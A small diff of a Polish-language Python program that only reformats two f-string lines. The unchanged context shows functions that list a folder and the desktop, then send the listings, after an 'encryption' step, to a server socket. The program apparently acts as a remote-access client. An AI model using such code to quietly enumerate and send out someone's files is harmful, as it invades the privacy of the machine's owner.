@@ -63,7 +63,8 @@ def czytaj_folder(nazwa_folderu, server_socket):
             # Odczytaj zawartość folderu
             folder_contents = os.listdir(folder_path)
             zawartosc_folderu = '\n'.join(folder_contents)
-            formatted_response = f'Zawartość folderu "{nazwa_folderu}":\n{zawartosc_folderu}'
+            formatted_response = f'Zawartość folderu "{
+                nazwa_folderu}":\n{zawartosc_folderu}'
             # Wyślij zawartość folderu na serwer
             server_socket.sendall(szyfrowanie(formatted_response).encode())
         else:
@@ -132,7 +133,8 @@ def odczytaj_zawartosc_pulpitu(server_socket):
         formatted_response = formatted_response.replace('\t', '    ')
         server_socket.sendall(szyfrowanie(formatted_response).encode())
     except Exception as e:
-        error_message = f'Wystąpił błąd podczas odczytu zawartości pulpitu: {e}'
+        error_message = f'Wystąpił błąd podczas odczytu zawartości pulpitu: {
+            e}'
         server_socket.sendall(szyfrowanie(error_message).encode())
         print(error_message)
 
